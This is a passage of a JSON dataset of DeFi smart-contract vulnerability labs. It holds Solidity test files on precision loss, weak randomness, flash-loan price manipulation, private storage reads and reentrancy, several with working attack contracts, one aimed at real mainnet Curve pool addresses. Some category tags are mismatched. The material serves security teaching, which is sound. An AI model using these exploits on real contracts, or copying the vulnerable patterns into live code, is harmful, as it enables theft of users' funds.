transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(\n        address src,\n        address dst,\n        uint wad\n    ) public returns (bool) {\n        require(balanceOf[src] >= wad);\n\n        if (\n            src != msg.sender && allowance[src][msg.sender] != type(uint128).max\n        ) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/phantom-permit.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "divmultiply",
    "slug": "divmultiply",
    "title": "Precision Issues - Divide before multiply",
    "description": "The contracts demonstrate a common issue when performing division operations in Solidity, \nas Solidity doesn't support floating-point numbers. The order of operations can affect the result due to integer truncation.\n\nIn the Miscalculation contract, the function price performs the division before the\nmultiplication (price / 100) discount. Due to the fact that Solidity truncates integers\nwhen dividing, the result of price / 100 will be 0 if the price is less than 100. \nThis causes the result of the multiplication to be 0 as well.\n\nOn the other hand, in the Calculation contract, the function price performs the multiplication\nbefore the division (price discount) / 100. This way, the result will be correct as the multiplication\ndoesn't get truncated, only the final result does.",
    "mitigation": "Always perform multiplication before division to avoid losing precision.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1599774264437395461\nhttps://blog.solidityscan.com/precision-loss-in-arithmetic-operations-8729aea20be9",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Precision Issues - Divide before multiply\n\nDescription:\nThe contracts demonstrate a common issue when performing division operations in Solidity, \nas Solidity doesn't support floating-point numbers. The order of operations can affect the result due to integer truncation.\n\nIn the Miscalculation contract, the function price performs the division before the\nmultiplication (price / 100) * discount. Due to the fact that Solidity truncates integers\nwhen dividing, the result of price / 100 will be 0 if the price is less than 100. \nThis causes the result of the multiplication to be 0 as well.\n\nOn the other hand, in the Calculation contract, the function price performs the multiplication\nbefore the division (price * discount) / 100. This way, the result will be correct as the multiplication\ndoesn't get truncated, only the final result does.\n\nMitigation:Always perform multiplication before division to avoid losing precision.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1599774264437395461\nhttps://blog.solidityscan.com/precision-loss-in-arithmetic-operations-8729aea20be9\n\n*/\ncontract ContractTest is Test {\n    Miscalculation MiscalculationContract;\n    Calculation CalculationContract;\n\n    function testMiscalculation() public {\n        MiscalculationContract = new Miscalculation();\n        console.log(\"Perform Miscalculation Contract\");\n        console.log(\n            \"Scenario: DeFi store 10% off now, Then we buy 1 item price: $80.\"\n        );\n        console.log(\n            \"Subtract the discount, get the sale price:\",\n            MiscalculationContract.price(80, 90)\n        );\n        console.log(\n            \"Solidity doesn't do decimals, so dividing before multiplying will round to zero. 0.8*90=0\"\n        );\n        console.log(\n            \"---------------------------------------------------------\"\n        );\n        CalculationContract = new Calculation();\n        console.log(\"Perform Correct calculation Contract\");\n        console.log(\n            \"Scenario: DeFi store 10% off now, Then we buy 1 item price: $80.\"\n        );\n        console.log(\n            \"Subtract  the discount, get the sale price:\",\n            CalculationContract.price(80, 90)\n        );\n        console.log(\"Multiply before dividing is correct. 80*90/100=72\");\n    }\n}\n\ncontract Miscalculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price / 100) * discount; // wrong calculation\n    }\n}\n\ncontract Calculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price * discount) / 100; // correct calculation\n    }\n}\n",
    "severity": "Medium",
    "category": "Oracle",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Divmultiply.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "precision-loss",
    "slug": "precision-loss",
    "title": "Precision Loss - rounding down to zero",
    "description": "Support all the ERC20 tokens, as those tokens may have different decimal places. \nFor example, USDT and USDC have 6 decimals. So, in the calculations, one must be careful.",
    "mitigation": "Avoid any situation that if the numerator is smaller than the denominator, the result will be zero.\nRounding down related issues can be avoided in many ways:\n    1.Using libraries for rounding up/down as expected\n    2.Requiring result is not zero or denominator is <= numerator\n    3.Refactor operations for avoiding first dividing then multiplying, when first dividing then multiplying, precision lost is amplified\n\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1675805135061286914\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/244\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/122\nhttps://dacian.me/precision-loss-errors#heading-rounding-down-to-zero",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Precision Loss - rounding down to zero\n\nDescription:\nSupport all the ERC20 tokens, as those tokens may have different decimal places. \nFor example, USDT and USDC have 6 decimals. So, in the calculations, one must be careful.\n\nMitigation:  \nAvoid any situation that if the numerator is smaller than the denominator, the result will be zero.\nRounding down related issues can be avoided in many ways:\n    1.Using libraries for rounding up/down as expected\n    2.Requiring result is not zero or denominator is <= numerator\n    3.Refactor operations for avoiding first dividing then multiplying, when first dividing then multiplying, precision lost is amplified\n\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1675805135061286914\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/244\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/122\nhttps://dacian.me/precision-loss-errors#heading-rounding-down-to-zero\n*/\n\ncontract ContractTest is Test {\n    SimplePool SimplePoolContract;\n\n    function setUp() public {\n        SimplePoolContract = new SimplePool();\n    }\n\n    function testRounding_error() public view {\n        SimplePoolContract.getCurrentReward();\n    }\n\n    receive() external payable {}\n}\n\ncontract SimplePool {\n    uint public totalDebt;\n    uint public lastAccrueInterestTime;\n    uint public loanTokenBalance;\n\n    constructor() {\n        totalDebt = 10000e6; //debt token is USDC and has 6 digit decimals.\n        lastAccrueInterestTime = block.timestamp - 1;\n        loanTokenBalance = 500e18;\n    }\n\n    function getCurrentReward() public view returns (uint _reward) {\n        // Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - lastAccrueInterestTime; //_timeDelta=1\n\n        // If the time passed is 0, return 0 reward\n        if (_timeDelta == 0) return 0;\n\n        // Calculate the supplied value\n        // uint _supplied = totalDebt + loanTokenBalance;\n        //console.log(_supplied);\n        // Calculate the reward\n        _reward = (totalDebt * _timeDelta) / (365 days * 1e18);\n        console.log(\"Current reward\", _reward);\n\n        // 31536000 is the number of seconds in a year\n        // 365 days * 1e18 = 31_536_000_000_000_000_000_000_000\n        //_totalDebt * _timeDelta / 31_536_000_000_000_000_000_000_000\n        // 10_000_000_000 * 1 / 31_536_000_000_000_000_000_000_000 // -> 0\n        _reward;\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Precision-loss.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "randomness",
    "slug": "randomness",
    "title": "Predictable Randomness Vulnerability",
    "description": "Use of global variables like block hash, block number, \nblock timestamp and other fields is insecure, miner and attacker can control it.",
    "mitigation": "Don't use blockhash and block.timestamp as source of randomness\n\nREF:\nhttps://solidity-by-example.org/hacks/randomness/",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Predictable Randomness Vulnerability\n\nDescription:\nUse of global variables like block hash, block number, \nblock timestamp and other fields is insecure, miner and attacker can control it.\n\nScenario:\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let's see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n\nMitigation:\nDon't use blockhash and block.timestamp as source of randomness\n\nREF:\nhttps://solidity-by-example.org/hacks/randomness/\n \n*/\n\ncontract ContractTest is Test {\n    GuessTheRandomNumber GuessTheRandomNumberContract;\n    Attack AttackerContract;\n\n    function testRandomness() public {\n        address alice = vm.addr(1);\n        address eve = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.prank(alice);\n\n        GuessTheRandomNumberContract = new GuessTheRandomNumber{\n            value: 1 ether\n        }();\n        vm.startPrank(eve);\n        AttackerContract = new Attack();\n        console.log(\n            \"Before exploiting, Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        AttackerContract.attack(GuessTheRandomNumberContract);\n        console.log(\n            \"Eve wins 1 Eth, Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n\ncontract Attack {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    // Helper function to check balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n",
    "severity": "Medium",
    "category": "Randomness",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Randomness.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "price-manipulation",
    "slug": "price-manipulation",
    "title": "Price manipulation",
    "description": "Incorrect price calculation over balanceOf, getReverse may refer to a situation \nwhere the price of a token or asset is not accurately calculated based on the balanceOf function.",
    "mitigation": "Use a manipulation resistant oracle, chainlink, TWAP, etc.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673948842738487296\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20221012-atk---flashloan-manipulate-price\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220807-egd-finance---flashloans--price-manipulation\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220428-deus-dao---flashloan--price-oracle-manipulation",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\nName: Price manipulation\n\nDescription:\nIncorrect price calculation over balanceOf, getReverse may refer to a situation \nwhere the price of a token or asset is not accurately calculated based on the balanceOf function.\n\nMitigation:  \nUse a manipulation resistant oracle, chainlink, TWAP, etc.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673948842738487296\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20221012-atk---flashloan-manipulate-price\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220807-egd-finance---flashloans--price-manipulation\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220428-deus-dao---flashloan--price-oracle-manipulation\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    USDb USDbContract;\n    SimplePool SimplePoolContract;\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        USDbContract = new USDb();\n        SimplePoolContract = new SimplePool(\n            address(USDaContract),\n            address(USDbContract)\n        );\n        SimpleBankContract = new SimpleBank(\n            address(USDaContract),\n            address(SimplePoolContract),\n            address(USDbContract)\n        );\n    }\n\n    function testPrice_Manipulation() public {\n        USDbContract.transfer(address(SimpleBankContract), 9000 ether);\n        USDaContract.transfer(address(SimplePoolContract), 1000 ether);\n        USDbContract.transfer(address(SimplePoolContract), 1000 ether);\n        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)\n        SimplePoolContract.getPrice(); // 1 USDa : 1 USDb\n\n        console.log(\n            \"There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb.\"\n        );\n        emit log_named_decimal_uint(\n            \"Current USDa convert rate\",\n            SimplePoolContract.getPrice(),\n            18\n        );\n        console.log(\"Start price manipulation\");\n        console.log(\"Borrow 500 USBa over floashloan\");\n        // Let's manipulate the price since the getPrice is over the balanceOf.\n        // Use flashloan to borrow 500 USDa\n        SimplePoolContract.flashLoan(500 ether, address(this), \"0x0\");\n    }\n\n    fallback() external {\n        //flashlon callback\n\n        emit log_named_decimal_uint(\n            \"Price manupulated, USDa convert rate\",\n            SimplePoolContract.getPrice(),\n            18\n        ); // 1 USDa : 2 USDb\n\n        USDaContract.approve(address(SimpleBankContract), 100 ether);\n        SimpleBankContract.exchange(100 ether);\n\n        // Repay the flashloan by transferring 500 USDb to SimplePoolContract\n        USDaContract.transfer(address(SimplePoolContract), 500 ether);\n\n        // Get the balance of USDb owned by us.\n        emit log_named_decimal_uint(\n            \"Use 100 USDa to convert, My USDb balance\",\n            USDbContract.balanceOf(address(this)),\n            18\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract USDb is ERC20, Ownable {\n    constructor() ERC20(\"USDB\", \"USDB\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract SimplePool {\n    IERC20 public USDaToken;\n    IERC20 public USDbToken;\n\n    constructor(address _USDa, address _USDb) {\n        USDaToken = IERC20(_USDa);\n        USDbToken = IERC20(_USDb);\n    }\n\n    function getPrice() public view returns (uint256) {\n        //Incorrect price calculation over balanceOf\n        uint256 USDaAmount = USDaToken.balanceOf(address(this));\n        uint256 USDbAmount = USDbToken.balanceOf(address(this));\n\n        // Ensure USDbAmount is not zero to prevent division by zero\n        if (USDaAmount == 0) {\n            return 0;\n        }\n\n        // Calculate the price as the ratio of USDa to USDb\n        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;\n        return USDaPrice;\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDaToken.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(\n            USDaToken.transfer(borrower, amount),\n            \"Flashloan transfer failed\"\n        );\n        (bool success, ) = borrower.call(data);\n        require(success, \"Flashloan callback failed\");\n        uint256 balanceAfter = USDaToken.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n\ncontract SimpleBank {\n    IERC20 public token; //USDA\n    SimplePool public pool;\n    IERC20 public payoutToken; //USDb\n\n    constructor(address _token, address _pool, address _payoutToken) {\n        token = IERC20(_token);\n        pool = SimplePool(_pool);\n        payoutToken = IERC20(_payoutToken);\n    }\n\n    function exchange(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n        uint256 price = pool.getPrice();\n        require(price > 0, \"Price cannot be zero\");\n        uint256 tokensToReceive = (amount * price) / (10 ** 18);\n        require(\n            payoutToken.transfer(msg.sender, tokensToReceive),\n            \"Payout transfer failed\"\n        );\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Price_manipulation.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "privatedata",
    "slug": "privatedata",
    "title": "Private Data Exposure",
    "description": "Solidity stores the variables defined in the contract in slots. Each slot can accommodate up to 32 bytes or 256 bits. Given that all data stored on-chain, whether public or private, can be read, it is possible to read private data from the Vault contract by predicting the memory slot where the private data resides.\n\nIf the Vault contract is utilized in a production environment, malicious actors could employ similar techniques to access sensitive information such as user passwords.",
    "mitigation": "Avoid storing sensitive data on-chain\n\nREF\nhttps://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Private Data Exposure\n\nDescription:\nSolidity stores the variables defined in the contract in slots. Each slot can accommodate up to 32 bytes or 256 bits. Given that all data stored on-chain, whether public or private, can be read, it is possible to read private data from the Vault contract by predicting the memory slot where the private data resides.\n\nIf the Vault contract is utilized in a production environment, malicious actors could employ similar techniques to access sensitive information such as user passwords.\nMitigation:\nAvoid storing sensitive data on-chain\n\nREF\nhttps://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d\n\n*/\n\ncontract ContractTest is Test {\n    Vault VaultContract;\n\n    function testReadprivatedata() public {\n        VaultContract = new Vault(123456789);\n        bytes32 leet = vm.load(address(VaultContract), bytes32(uint256(0)));\n        console.log(uint256(leet));\n\n        // users in slot 1 - length of array\n        // starting from slot hash(1) - array elements\n        // slot where array element is stored = keccak256(slot)) + (index * elementSize)\n        // where slot = 1 and elementSize = 2 (1 (uint) +  1 (bytes32))\n        bytes32 user = vm.load(\n            address(VaultContract),\n            VaultContract.getArrayLocation(1, 1, 1)\n        );\n        console.log(uint256(user));\n    }\n}\n\ncontract Vault {\n    // slot 0\n    uint256 private password;\n\n    constructor(uint256 _password) {\n        password = _password;\n        User memory user = User({id: 0, password: bytes32(_password)});\n        users.push(user);\n        idToUser[0] = user;\n    }\n\n    struct User {\n        uint id;\n        bytes32 password;\n    }\n\n    // slot 1\n    User[] public users;\n    // slot 2\n    mapping(uint => User) public idToUser;\n\n    function getArrayLocation(\n        uint slot,\n        uint index,\n        uint elementSize\n    ) public pure returns (bytes32) {\n        uint256 a = uint(keccak256(abi.encodePacked(slot))) +\n            (index * elementSize);\n        return bytes32(a);\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Privatedata.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "read-only-reentrancy",
    "slug": "read-only-reentrancy",
    "title": "Read-Only Reentrancy Vulnerability",
    "description": "The Read-Only Reentrancy Vulnerability is a flaw in smart contract design that allows attackers \nto exploit the \"read-only\" nature of a function to make unintended changes to the contract's state. \nSpecifically, the vulnerability arises when an attacker uses the remove_liquidity function of the ICurve contract \nto trigger the receive function in the ExploitContract. This is achieved by an external call \nfrom a secure smart contract \"A\" invoking the fallback() function in the attacker's contract.\n\nThrough this exploit, the attacker gains the ability to execute code within the fallback() function\nagainst a target contract \"B,\" which is indirectly related to contract \"A.\" Contract \"B\" derives\nthe price of the LP token from Contract \"A,\" making it susceptible to manipulation and unintended price changes\nthrough the reentrancy attack.",
    "mitigation": "Avoid any state-changing operations within functions that are intended to be read-only.\nMakerdao example:\n        // This will revert if called during execution of a state-modifying pool function.\n        if (nonreentrant) {\n            uint256[2] calldata amounts;\n            CurvePoolLike(pool).remove_liquidity(0, amounts);\n        }\n\nREF\nhttps://twitter.com/1nf0s3cpt/status/1590622114834706432\nhttps://chainsecurity.com/heartbreaks-curve-lp-oracles/\nhttps://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334\nhttps://www.youtube.com/watch?v=0fgGTRlsDxI",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n/*\nName: Read-Only Reentrancy Vulnerability\n\nDescription:\nThe Read-Only Reentrancy Vulnerability is a flaw in smart contract design that allows attackers \nto exploit the \"read-only\" nature of a function to make unintended changes to the contract's state. \nSpecifically, the vulnerability arises when an attacker uses the remove_liquidity function of the ICurve contract \nto trigger the receive function in the ExploitContract. This is achieved by an external call \nfrom a secure smart contract \"A\" invoking the fallback() function in the attacker's contract.\n\nThrough this exploit, the attacker gains the ability to execute code within the fallback() function\nagainst a target contract \"B,\" which is indirectly related to contract \"A.\" Contract \"B\" derives\nthe price of the LP token from Contract \"A,\" making it susceptible to manipulation and unintended price changes\nthrough the reentrancy attack.\n\nMitigation:\nAvoid any state-changing operations within functions that are intended to be read-only.\nMakerdao example:\n        // This will revert if called during execution of a state-modifying pool function.\n        if (nonreentrant) {\n            uint256[2] calldata amounts;\n            CurvePoolLike(pool).remove_liquidity(0, amounts);\n        }\n\nREF\nhttps://twitter.com/1nf0s3cpt/status/1590622114834706432\nhttps://chainsecurity.com/heartbreaks-curve-lp-oracles/\nhttps://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334\nhttps://www.youtube.com/watch?v=0fgGTRlsDxI\n\n*/\n\ninterface ICurve {\n    function get_virtual_price() external view returns (uint);\n\n    function add_liquidity(\n        uint[2] calldata amounts,\n        uint min_mint_amount\n    ) external payable returns (uint);\n\n    function remove_liquidity(\n        uint lp,\n        uint[2] calldata min_amounts\n    ) external returns (uint[2] memory);\n\n    function remove_liquidity_one_coin(\n        uint lp,\n        int128 i,\n        uint min_amount\n    ) external returns (uint);\n}\n\naddress constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;\naddress constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token\n\n// VulnContract\n// users stake LP_TOKEN\n// getReward rewards the users based on the current price of the pool LP token\ncontract VulnContract {\n    IERC20 public constant token = IERC20(LP_TOKEN);\n    ICurve private constant pool = ICurve(STETH_POOL);\n\n    mapping(address => uint) public balanceOf;\n\n    function stake(uint amount) external {\n        token.transferFrom(msg.sender, address(this), amount);\n        balanceOf[msg.sender] += amount;\n    }\n\n    function unstake(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n    }\n\n    function getReward() external view returns (uint) {\n        //rewarding tokens based on the current virtual price of the pool LP token\n        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /\n            1 ether;\n        // Omitting code to transfer reward tokens\n        return reward;\n    }\n}\n\ncontract ExploitContract {\n    ICurve private constant pool = ICurve(STETH_POOL);\n    IERC20 public constant lpToken = IERC20(LP_TOKEN);\n    VulnContract private immutable target;\n\n    constructor(address _target) {\n        target = VulnContract(_target);\n    }\n\n    // Stake LP into VulnContract\n    function stakeTokens() external payable {\n        uint[2] memory amounts = [msg.value, 0];\n        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);\n        console.log(\n            \"LP token price after staking into VulnContract\",\n            pool.get_virtual_price()\n        );\n\n        lpToken.approve(address(target), lp);\n        target.stake(lp);\n    }\n\n    // Perform Read-Only Reentrancy\n    function performReadOnlyReentrnacy() external payable {\n        // Add liquidity to Curve\n        uint[2] memory amounts = [msg.value, 0];\n        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);\n        // Log get_virtual_price\n        console.log(\n            \"LP token price before remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n        // Remove liquidity from Curve\n        // remove_liquidity() invokes the recieve() callback\n        uint[2] memory min_amounts = [uint(0), uint(0)];\n        pool.remove_liquidity(lp, min_amounts);\n        // Log get_virtual_price\n        console.log(\n            \"--------------------------------------------------------------------\"\n        );\n        console.log(\n            \"LP token price after remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n\n        // Attack - Log reward amount\n        uint reward = target.getReward();\n        console.log(\"Reward if Read-Only Reentrancy is not invoked: \", reward);\n    }\n\n    receive() external payable {\n        // receive() is called when the remove_liquidity is called\n        console.log(\n            \"--------------------------------------------------------------------\"\n        );\n        console.log(\n            \"LP token price during remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n        // Attack - Log reward amount\n        uint reward = target.getReward();\n        console.log(\"Reward if Read-Only Reentrancy is invoked: \", reward);\n    }\n}\n\ncontract ExploitTest is Test {\n    ExploitContract public hack;\n    VulnContract public target;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\");\n        target = new VulnContract(); // deploy the vulnerable contract\n        hack = new ExploitContract(address(target)); // deploy attacker contract\n    }\n\n    function testPwn() public {\n        hack.stakeTokens{value: 10 ether}(); // stake 10 eth in VulnContract\n        hack.performReadOnlyReentrnacy{value: 100000 ether}();\n    }\n}\n",
    "severity": "Medium",
    "category": "Reentrancy",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/ReadOnlyReentrancy.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "reentrancy",
    "slug": "reentrancy",
    "title": "Reentrancy Vulnerability",
    "description": "The EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows \nan attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. \nThe vulnerability arises due to the withdrawFunds function in the EtherStore contract,\nwhere the Ether is transferred to the attacker's address before updating their balance. \nThis allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, \nleading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.",
    "mitigation": "Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a\nhttps://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Reentrancy Vulnerability\n\nDescription:\nThe EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows \nan attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. \nThe vulnerability arises due to the withdrawFunds function in the EtherStore contract,\nwhere the Ether is transferred to the attacker's address before updating their balance. \nThis allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, \nleading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.\n\nScenario:\nEtherStore is a simple vault, it can manage everyone's ethers.\nBut it's vulnerable, can you steal all the ethers ?\n\nMitigation:\nFollow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a\nhttps://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/\n\n*/\n\ncontract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n\n        // check if after send still enough to avoid underflow\n        if (balances[msg.sender] >= _weiToWithdraw) {\n            balances[msg.sender] -= _weiToWithdraw;\n        }\n    }\n}\n\ncontract EtherStoreRemediated {\n    mapping(address => uint256) public balances;\n    bool internal locked;\n\n    modifier nonReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        balances[msg.sender] -= _weiToWithdraw;\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    EtherStore store;\n    EtherStoreRemediated storeRemediated;\n    EtherStoreAttack attack;\n    EtherStoreAttack attackRemediated;\n\n    function setUp() public {\n        store = new EtherStore();\n        storeRemediated = new EtherStoreRemediated();\n        attack = new EtherStoreAttack(address(store));\n        attackRemediated = new EtherStoreAttack(address(storeRemediated));\n        vm.deal(address(store), 5 ether);\n        vm.deal(address(storeRemediated), 5 ether);\n        vm.deal(address(attack), 2 ether);\n        vm.deal(address(attackRemediated), 2 ether);\n    }\n\n    function testReentrancy() public {\n        attack.Attack();\n    }\n\n    function test_RevertRemediated() public {\n        attackRemediated.Attack();\n    }\n}\n\ncontract EtherStoreAttack is Test {\n    EtherStore store;\n\n    constructor(address _store) {\n        store = EtherStore(_store);\n    }\n\n    function Attack() public {\n        console.log(\"EtherStore balance\", address(store).balance);\n\n        store.deposit{value: 1 ether}();\n\n        console.log(\n            \"Deposited 1 Ether, EtherStore balance\",\n            address(store).balance\n        );\n        store.withdrawFunds(1 ether); // exploit here\n\n        console.log(\"Attack contract balance\", address(this).balance);\n        console.log(\"EtherStore balance\", address(store).balance);\n    }\n\n    // fallback() external payable {}\n\n    // we want to use fallback function to exploit reentrancy\n    receive() external payable {\n        console.log(\"Attack contract balance\", address(this).balance);\n        console.log(\"EtherStore balance\", 